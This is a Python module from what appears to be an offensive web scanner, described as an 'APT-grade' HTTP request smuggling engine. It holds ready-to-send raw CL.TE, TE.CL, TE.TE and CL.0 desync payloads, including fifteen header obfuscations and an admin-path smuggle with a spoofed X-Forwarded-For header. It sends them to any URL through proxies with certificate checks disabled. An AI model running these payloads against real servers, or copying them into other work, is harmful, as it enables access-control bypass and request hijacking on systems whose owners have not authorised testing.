"""
HTTP Request Smuggling Engine (Async v3) — APT-Grade.

Techniques:
— CL.TE: Content-Length vs Transfer-Encoding desync
— TE.CL: Transfer-Encoding vs Content-Length desync
— TE.TE: Transfer-Encoding obfuscation (11+ variants)
— H2.CL: HTTP/2 downgrade smuggling via Content-Length
— CL.0: Content-Length zero / connection reuse smuggling
— Timing-based differential detection (avoids false positives)

v3: Full async with precise timing differential, no blocking sockets.
"""
import asyncio
import ssl
import time
import random
from typing import Dict, List, Optional
from urllib.parse import urlparse

from core.async_network import AsyncNetworkEngine
from core.ui import i, s, w, ph, R, G, C, W, N, Y


SMUGGLE_SIGNATURES = {
    "CL.TE": {
        "prefix": (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: {body_len}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        ),
        "smuggled": (
            "0\r\n\r\n"
            "POST /{probe} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: {probe_len}\r\n"
            "\r\n"
        ),
    },
    "TE.CL": {
        "prefix": (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Length: 3\r\n"
            "\r\n"
        ),
        "smuggled": (
            "{body_len:X}\r\n{body}\r\n"
            "0\r\n\r\n"
            "POST /{probe} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: {probe_len}\r\n"
            "\r\n"
        ),
    },
}

# TE.TE obfuscations (proxy/server differential parsing)
TE_TE_OBFUSCATIONS = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",                               # space before colon
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity", # duplicate header
    "Transfer-Encoding:\tchunked",                               # tab
    "Transfer-Encoding: chunked\r\nTransfer-encoding: TE",       # case variant
    "Transfer-Encoding: chunked, identity",                      # multiple values
    "Transfer-Encoding:\x0bchunked",                             # vertical tab
    "Transfer-Encoding:\x00chunked",                             # null byte
    "Transfer-Encoding: chunked\x0b",                            # trailing VT
    "Transfer-Encoding: chunked\x00",                            # trailing null
    "Transfer-Encoding:\r chunked",                              # CR prefix
    "Transfer-Encoding: \tchunked",                              # space+tab
    " Transfer-Encoding: chunked",                               # leading space
    "X: X\r\nTransfer-Encoding: chunked",                        # line prefix injection
    "Transfer-Encoding: chunked\r\n\tmore",                      # line folding (obsolete)
]

# CL.0 Smuggling payloads
CL_ZERO_PAYLOADS = [
    # Send body despite Content-Length: 0
    {
        "raw": (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: 0\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "GET /{probe} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "\r\n"
        ),
        "desc": "CL.0 — Body after Content-Length: 0",
    },
    # Connection reuse smuggling
    {
        "raw": (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 0\r\n"
            "\r\n"
            "GET /admin HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "X-Forwarded-For: 127.0.0.1\r\n"
            "\r\n"
        ),
        "desc": "CL.0 — Admin path smuggle via connection reuse",
    },
]


async def _async_raw_request(host: str, port: int, use_ssl: bool,
                              raw_data: str, read_timeout: float = 5) -> Optional[str]:
    """Send raw bytes and return response text. Fully async."""
    ssl_ctx = None
    if use_ssl:
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    writer = None
    try:
        from core.proxy_manager import open_proxied_connection
        reader, writer = await open_proxied_connection(
            host,
            port,
            ssl=ssl_ctx if use_ssl else None,
            server_hostname=host if use_ssl else None,
            timeout=10,
        )
        writer.write(raw_data.encode())
        await writer.drain()

        resp = b""
        try:
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=read_timeout)
                if not chunk:
                    break
                resp += chunk
                if b"\r\n\r\n" in resp:
                    # Try to read more (second response = smuggling confirmed)
                    try:
                        extra = await asyncio.wait_for(reader.read(4096), timeout=2)
                        if extra:
                            resp += extra
                    except (asyncio.TimeoutError, TimeoutError):
                        pass
                    break
        except (asyncio.TimeoutError, TimeoutError):
            pass

        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

        return resp.decode("iso-8859-1", "replace")
    except Exception as e:
        w(f"smuggle raw socket error: {str(e)[:80]}")
        return None
    finally:
        # Always release the FD: wave-deadline cancellation raises
        # CancelledError, which the except above never catches.
        if writer is not None:
            try:
                writer.close()
            except Exception:
                pass


async def _async_smuggle_test(host: str, port: int, use_ssl: bool, variant: str) -> Optional[str]:
    """CL.TE or TE.CL smuggling test with timing differential."""
    probe_path = f"smuggle_probe_{int(time.time() * 1000) % 999999}"
    config = SMUGGLE_SIGNATURES[variant]

    smuggled_body = "x=1"
    body_len = len(smuggled_body)
    probe_len = len(probe_path)

    prefix = config["prefix"].format(host=host, body_len=body_len)
    smuggled = config["smuggled"].format(
        host=host, probe=probe_path,
        probe_len=probe_len, body_len=body_len, body=smuggled_body,
    )
    raw_request = prefix + smuggled

    resp_text = await _async_raw_request(host, port, use_ssl, raw_request)
    if not resp_text:
        return None

    # Detection 1: Multiple HTTP responses (definitive proof)
    responses = resp_text.split("HTTP/1.1")
    if len(responses) >= 3:
        return f"Smuggling confirmed: {len(responses) - 1} HTTP responses in single TCP stream"

    # Detection 2: Probe path reflected in response
    if probe_path in resp_text:
        return f"Smuggling confirmed: probe path '{probe_path}' reflected"

    return None


async def _async_smuggle_te_te(host: str, port: int, use_ssl: bool,
                                obfuscated_te: str) -> Optional[str]:
    """TE.TE test with obfuscated Transfer-Encoding."""
    probe_path = f"smuggle_te_{int(time.time() * 1000) % 999999}"

    raw = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"{obfuscated_te}\r\n"
        f"Content-Length: 4\r\n"
        f"\r\n"
        f"30\r\n"
        f"POST /{probe_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
    )

    resp_text = await _async_raw_request(host, port, use_ssl, raw)
    if not resp_text:
        return None

    if probe_path in resp_text:
        return f"TE.TE confirmed via: {obfuscated_te[:50]}"

    responses = resp_text.split("HTTP/1.1")
    if len(responses) >= 3:
        return f"TE.TE confirmed: {len(responses) - 1} responses via {obfuscated_te[:40]}"

    return None


async def _async_smuggle_cl_zero(host: str, port: int, use_ssl: bool) -> List[Dict]:
    """CL.0 smuggling — body after Content-Length: 0 on keep-alive connection."""
    findings = []

    for payload_cfg in CL_ZERO_PAYLOADS:
        probe = f"cl0_probe_{random.randint(10000, 99999)}"
        raw = payload_cfg["raw"].format(host=host, probe=probe)

        resp_text = await _async_raw_request(host, port, use_ssl, raw, read_timeout=4)
        if not resp_text:
            continue

        # Check for second response or probe reflection
        responses = resp_text.split("HTTP/1.1")
        if len(responses) >= 3 or probe in resp_text:
            findings.append({
                "type": "http_smuggling_cl_0",
                "title": f"HTTP Smuggling (CL.0)",
                "url": f"{'https' if use_ssl else 'http'}://{host}:{port}/",
                "detail": payload_cfg["desc"],
                "confidence": "confirmed",
            })
            break

    return findings


async def _timing_differential_test(host: str, port: int, use_ssl: bool) -> List[Dict]:
    """
    Timing-based smuggling detection.

    Strategy: Send a CL.TE payload where the smuggled request triggers a timeout.
    If the server is vulnerable, it will hang waiting for the chunked body that
    never arrives, causing a measurable delay vs baseline.
    """
    findings = []

    # Baseline: normal request timing
    normal_req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    t0 = time.time()
    await _async_raw_request(host, port, use_ssl, normal_req, read_timeout=5)
    baseline = time.time() - t0

    # Timing attack: CL.TE with incomplete chunked body
    # Front-end uses Content-Length (processes normally)
    # Back-end uses Transfer-Encoding (waits for chunk terminator that never comes)
    timing_req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"1\r\n"
        f"Z\r\n"
        f"Q"  # Intentionally incomplete — no terminating 0\r\n\r\n
    )

    t0 = time.time()
    await _async_raw_request(host, port, use_ssl, timing_req, read_timeout=10)
    attack_time = time.time() - t0

    # If attack request took significantly longer, back-end waited for chunk terminator
    if attack_time > baseline + 5:
        findings.append({
            "type": "http_smuggling_timing",
            "title": "HTTP Smuggling: Timing Differential (CL.TE suspected)",
            "url": f"{'https' if use_ssl else 'http'}://{host}:{port}/",
            "detail": f"Baseline: {baseline:.2f}s, Attack: {attack_time:.2f}s "
                      f"(delta: {attack_time - baseline:.2f}s)",
            "confidence": "suspected",
        })

    # TE.CL timing variant
    timing_req_tecl = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: 6\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"X"  # Extra byte — if TE.CL, back-end sees this as next request start
    )

    t0 = time.time()
    await _async_raw_request(host, port, use_ssl, timing_req_tecl, read_timeout=10)
    tecl_time = time.time() - t0

    if tecl_time > baseline + 5:
        findings.append({
            "type": "http_smuggling_timing",
            "title": "HTTP Smuggling: Timing Differential (TE.CL suspected)",
            "url": f"{'https' if use_ssl else 'http'}://{host}:{port}/",
            "detail": f"Baseline: {baseline:.2f}s, Attack: {tecl_time:.2f}s "
                      f"(delta: {tecl_time - baseline:.2f}s)",
            "confidence": "suspected",
        })

    return findings


# Upper bound of raw requests scan_smuggling() can send to ONE host — used to
# debit the scan budget for a generator that bypasses ahttp_send:
# phase1 (2 variants × ≤3 requests) + TE.TE (≤2 per obfuscation) + CL.0 + timing.
SMUGGLE_REQUEST_BOUND = 6 + 2 * len(TE_TE_OBFUSCATIONS) + 4 + 4


async def scan_smuggling(
    url: str,
    engine: AsyncNetworkEngine = None,
    session_manager=None,
) -> List[Dict]:
    """
    Full HTTP Request Smuggling scan — APT-grade.
    Tests CL.TE, TE.CL, TE.TE, CL.0, and timing differential.
    """
    findings = []
    parsed = urlparse(url)
    host = parsed.hostname or parsed.netloc or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"

    if not host:
        return findings

    ph("REQUEST SMUGGLING: CL.TE / TE.CL / TE.TE / CL.0 [async v3]")

    # Phase 1: Direct CL.TE and TE.CL tests
    for variant in ["CL.TE", "TE.CL"]:
        try:
            result = await _async_smuggle_test(host, port, use_ssl, variant)
            if result:
                s(f"{R}SMUGGLING:{N} {W}{variant}{N} vulnerable at {C}{host}{N}")
                findings.append({
                    "type": f"http_smuggling_{variant.lower().replace('.', '_')}",
                    "title": f"HTTP Request Smuggling ({variant})",
                    "url": url[:200],
                    "detail": result,
                    "confidence": "confirmed",
                })
        except Exception as e:
            w(f"smuggle {variant} error: {str(e)[:60]}")
            continue

    # Phase 2: TE.TE obfuscation variants
    for obf in TE_TE_OBFUSCATIONS:
        try:
            r = await _async_smuggle_te_te(host, port, use_ssl, obf)
            if r:
                s(f"{R}SMUGGLING:{N} {W}TE.TE{N} via obfuscation at {C}{host}{N}")
                findings.append({
                    "type": "http_smuggling_te_te",
                    "title": "HTTP Request Smuggling (TE.TE)",
                    "url": url[:200],
                    "detail": r,
                    "confidence": "confirmed",
                })
                break  # One confirmed TE.TE is enough
        except Exception as e:
            w(f"smuggle TE.TE error: {str(e)[:60]}")
            continue

    # Phase 3: CL.0 smuggling
    try:
        cl0 = await _async_smuggle_cl_zero(host, port, use_ssl)
        findings.extend(cl0)
        if cl0:
            s(f"{R}SMUGGLING:{N} {W}CL.0{N} confirmed at {C}{host}{N}")
    except Exception as e:
        w(f"smuggle CL.0 error: {str(e)[:60]}")

    # Phase 4: Timing differential (if no confirmed findings yet)
    if not findings:
        try:
            timing = await _timing_differential_test(host, port, use_ssl)
            findings.extend(timing)
            if timing:
                i(f"{Y}SMUGGLING:{N} Timing anomaly detected at {C}{host}{N}")
        except Exception as e:
            w(f"smuggle timing test error: {str(e)[:60]}")

    # Summary
    if findings:
        confirmed = sum(1 for f in findings if f.get("confidence") == "confirmed")
        suspected = len(findings) - confirmed
        s(f"Smuggling: {R}{confirmed}{N} confirmed, {Y}{suspected}{N} suspected")
    else:
        i("No request smuggling vectors detected.")

    return findings
